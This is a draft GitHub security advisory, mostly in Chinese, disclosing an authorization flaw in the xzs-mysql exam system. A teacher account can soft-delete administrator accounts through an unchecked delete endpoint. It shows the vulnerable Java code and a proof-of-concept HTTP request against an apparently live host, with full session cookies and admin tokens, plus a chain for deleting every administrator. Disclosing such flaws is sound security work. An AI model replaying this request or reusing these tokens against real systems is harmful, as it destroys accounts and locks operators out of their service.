# GitHub Security Advisory

---

| 字段            | 内容                                                       |
| --------------- | ---------------------------------------------------------- |
| **Advisory ID** | `GHSA-xzs-idor-delete-user`                                |
| **CVE ID**      | (待分配)                                                   |
| **CWE ID**      | CWE-639 — Authorization Bypass Through User-Controlled Key |
| **Severity**    | **High** (CVSS 7.5)                                        |
| **Status**      | Draft                                                      |
| **Published**   | (待发布)                                                   |

---

## Package Information

| 字段                  | 内容                                  |
| --------------------- | ------------------------------------- |
| **Ecosystem**         | Other（学之思开源考试系统 xzs-mysql） |
| **Package Name**      | `com.mindskip:xzs`                    |
| **Affected Versions** | `<= 3.9.0`                            |
| **Patched Version**   | 暂无（待修复）                        |

---

## CVSS Score

| 字段              | 值                                             |
| ----------------- | ---------------------------------------------- |
| **CVSS Version**  | 3.1                                            |
| **Vector String** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` |
| **Score**         | **7.5 (High)**                                 |

### CVSS 指标详解

| 指标 | 值        | 理由                                               |
| ---- | --------- | -------------------------------------------------- |
| AV:N | Network   | 通过网络即可利用                                   |
| AC:L | Low       | 仅需修改 URL 中的 ID 参数                          |
| PR:L | Low       | 需要教师级别 (role=2) 认证账号                     |
| UI:N | None      | 无需用户交互                                       |
| S:U  | Unchanged | 影响范围不超出当前应用                             |
| C:N  | None      | 删除操作不泄露额外数据                             |
| I:H  | High      | 教师可越权删除管理员与学生账号，数据完整性严重破坏 |
| A:H  | High      | 被删除账号完全不可用，影响系统整体可用性           |

---

## Summary

学之思开源考试系统（xzs-mysql）教师端 `POST /api/teacher/user/delete/{id}` 接口存在**垂直越权删除**漏洞。该接口接收用户 ID 后执行 `getUserById(id)` → `setDeleted(true)` → `updateByIdFilter()`，完全未校验"当前用户是否有权删除目标用户"。已认证的教师用户 (role=2) 可删除管理员账号 (role=3)，属于低权限用户执行高权限操作的垂直越权。

---

## Description

### 受影响端点

| 项目         | 内容                                                         |
| ------------ | ------------------------------------------------------------ |
| **端点**     | `POST /api/teacher/user/delete/{id}`                         |
| **部署环境** | 教师端（Port 7002）                                          |
| **文件**     | `controller/admin/UserController.java`（复用为 TeacherUserController） |
| **行号**     | 136-142                                                      |

### 漏洞代码

```java
// UserController.delete() — 教师端复用此代码逻辑
@RequestMapping(value = "/delete/{id}", method = RequestMethod.POST)
public RestResponse delete(@PathVariable Integer id) {

    // ① 仅按 ID 查询目标用户
    User user = userService.getUserById(id);
    //   ↑ id=2 可能是管理员账号, 无任何归属或角色校验

    // ② 无条件软删除
    user.setDeleted(true);

    // ③ 持久化: UPDATE t_user SET deleted=1 WHERE id=?
    userService.updateByIdFilter(user);

    // ④ 返回成功
    return RestResponse.ok();
}
```

### 缺失的权限校验（三重缺失）

```java
// 以下三项校验在代码中全部缺失：

User currentUser = getCurrentUser();       // 教师, role=2
User targetUser = userService.getUserById(id);

// 缺失 1: 不能删除自己
// if (targetUser.getId().equals(currentUser.getId())) → 403

// 缺失 2: 只能删除角色低于自己的用户
// if (targetUser.getRole() >= currentUser.getRole()) → 403

// 缺失 3: 教师根本不应有此权限
// 该端点应仅在管理员端 (/api/admin) 暴露
```

### 数据流

```
POST /api/teacher/user/delete/2       ← 教师指定管理员 ID=2
  → TeacherUserController.delete(id=2)
    → userService.getUserById(2)       ← 无条件查询, 返回管理员账号
    → user.setDeleted(true)            ← 无条件软删除
    → userService.updateByIdFilter()   ← UPDATE t_user SET deleted=1 WHERE id=2
  → RestResponse.ok()                  ← 管理员账号被成功删除
```

### 角色关系

```
role=1 (学生) ─── 只能访问学生端功能
role=2 (教师) ─── 应只能管理学生, 不应触达管理员账号
role=3 (管理员) ── 应有全部管理权限

漏洞: 教师(role=2) → /api/teacher/user/delete/{id} → 删除管理员(role=3)
```

---

## Impact

1. **账号安全**（严重）：
   - 教师可删除管理员账号，导致管理员无法登录
   - 可能删除超级管理员，使系统无人可管理

2. **业务连续性破坏**（严重）：
   - 被删除用户的所有资源（试卷/试题/答卷）不可访问
   - 若系统仅有一个管理员账号被删除，需直接操作数据库恢复

3. **攻击链升级**：
   - 配合越权查询 (`GHSA-xzs-idor-role-param`) 获取管理员 ID 列表后, 可逐一删除所有管理员
   - 删除所有管理员后系统进入无管理状态

---

## Proof of Concept

### 请求

```http
POST /api/teacher/user/delete/2 HTTP/1.0
Host: www.mindskip.net:7002
Cookie: Hm_lvt_c7122418f8b68956b5e4fcbc714d1bd6=1782193317; HMACCOUNT=D6DA7C99C6233FBE; SESSION=ZDU1ZjdhMzgtNTM4Yy00MGUyLWJlYWItNGY5N2NmZDBkOTBm; XzsTeacherUserName=teacher; XzsAdminUserName=admin; Hm_lvt_13b01d30310555bf6ddd960e49eda427=1782197609; sdd-admin-user-name=admin; sdd-admin-real-name=%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98; sdd-admin-token=E7n5igSoB7YaZYliri6l9+fE18SpKXjphnl+p39I8ZTqNtpGhG6tBVJiTEQG/nFb0icIlmBcUCwNCnTHfZjuv0nNtOKah+pFTMRz0ZXPB397ycgt+pdD0imx1Rok57IYXHFIrDrT0/uCPO1zP+PaXHlS/TLbpHSfY4kAWaBbptg=; sdd-organization-user-name=mindskip; sdd-organization-real-name=%E5%AD%A6%E6%A0%A1%E7%AE%A1%E7%90%86; sdd-organization-token=g4Bwho0P8ag4K9xrvGo5OseEDi963j7Trash6b8v8rqyoScSxj3fYLuzDfgaNsWw50tH4Cw3x8M++2lA3G9pDei8PEfgwS3UOStooe8lYLSOGP4IjTNKERYfZNIRLifxRNSEUxT36/LRGhzjrLvfecwVXwa7GF+K9Tir2QC35cU=; Hm_lpvt_13b01d30310555bf6ddd960e49eda427=1782199917; XzsStudentUserName=student; XzsStudentImagePath=https://www.mindskip.net:7008/resource/image/70f0ddc9-8947-48d5-ac1d-54fe60f9ecbf/cs.png; Hm_lpvt_c7122418f8b68956b5e4fcbc714d1bd6=1782221842
Content-Length: 2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Request-Ajax: true
Origin: https://www.mindskip.net:7002
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.mindskip.net:7002/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=1, i
Connection: keep-alive

{}
```
<img width="1189" height="669" alt="图片2" src="https://github.com/user-attachments/assets/f28fe1d2-a409-4ae2-948b-d9a64ab99d73" />

### 预期正常行为

教师 (role=2) 调用此接口时：

- 不应暴露该端点（仅管理员应有删除用户权限）
- 即使暴露，请求删除管理员 (ID=2, role=3) 时应返回 `403 Forbidden`

### 实际异常行为

```json
{
  "code": 1,
  "message": "成功",
  "response": null
}
```

管理员 (ID=2, role=3) 账号被成功软删除 (`t_user.deleted=1`)。该管理员无法再登录系统。

---

## 
